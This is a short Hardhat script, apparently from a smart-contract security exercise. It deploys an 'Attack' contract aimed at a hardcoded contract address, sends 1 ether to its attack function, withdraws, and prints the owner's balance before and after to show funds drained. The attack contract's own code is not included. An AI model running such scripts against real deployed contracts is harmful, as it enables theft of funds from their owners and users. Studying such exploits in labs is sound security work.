import { formatEther, parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

async function main() {
  const Attack = await ethers.getContractFactory("Attack");
  const attack = await Attack.deploy(
    "0xF39f39F3A1959e979A3591253AaC1b9c14F9a57a"
  );

  const [owner] = await ethers.getSigners();

  console.log(
    await owner.provider
      ?.getBalance(owner.address)
      .then((res) => formatEther(res))
  );

  await attack.attack({ value: parseEther("1") }).then((tx) => tx.wait());

  await attack.withdraw().then((tx) => tx.wait());

  console.log(
    await owner.provider
      ?.getBalance(owner.address)
      .then((res) => formatEther(res))
  );
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
